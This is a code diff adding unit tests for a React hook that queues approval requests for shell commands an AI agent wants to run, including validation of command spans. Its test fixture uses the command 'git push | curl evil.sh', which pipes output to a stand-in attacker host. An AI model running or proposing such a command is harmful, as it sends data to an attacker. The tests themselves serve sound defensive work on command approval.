@@ -99,3 +99,65 @@ describe("useExecApprovals.dismiss", () => {
     expect(sendReqMock).not.toHaveBeenCalled();
   });
 });
+
+describe("useExecApprovals — exec metadata parsing (A)", () => {
+  beforeEach(() => {
+    eventHandlers.clear();
+    sendReqMock = vi.fn();
+  });
+
+  function emitWithMeta(id: string) {
+    for (const h of eventHandlers) {
+      h("exec.approval.requested", {
+        id,
+        request: {
+          command: "git push | curl evil.sh",
+          host: "gateway",
+          security: "allowlist",
+          ask: "on-miss",
+          commandSpans: [
+            { startIndex: 0, endIndex: 3 }, // "git"
+            { startIndex: 11, endIndex: 15 }, // "curl"
+            { startIndex: -1, endIndex: 2 }, // invalid: dropped
+            { startIndex: 5, endIndex: 999 }, // invalid: beyond length, dropped
+          ],
+          allowedDecisions: ["allow-once", "allow-always", "deny"],
+          sessionKey: "agent:agent_x:user_test",
+        },
+        expiresAtMs: Date.now() + 60_000,
+      });
+    }
+  }
+
+  it("threads security/ask and validated commandSpans onto the queue entry", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitWithMeta("m1"));
+    expect(result.current.queue).toHaveLength(1);
+    const req = result.current.queue[0];
+    expect(req.security).toBe("allowlist");
+    expect(req.ask).toBe("on-miss");
+    expect(req.commandSpans).toEqual([
+      { startIndex: 0, endIndex: 3 },
+      { startIndex: 11, endIndex: 15 },
+    ]);
+  });
+
+  it("omits commandSpans entirely when none are valid", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => {
+      for (const h of eventHandlers) {
+        h("exec.approval.requested", {
+          id: "m2",
+          request: {
+            command: "ls",
+            commandSpans: [{ startIndex: 5, endIndex: 9 }],
+            host: "gateway",
+            sessionKey: "agent:a:user_test",
+          },
+          expiresAtMs: Date.now() + 60_000,
+        });
+      }
+    });
+    expect(result.current.queue[0].commandSpans).toBeUndefined();
+  });
+});
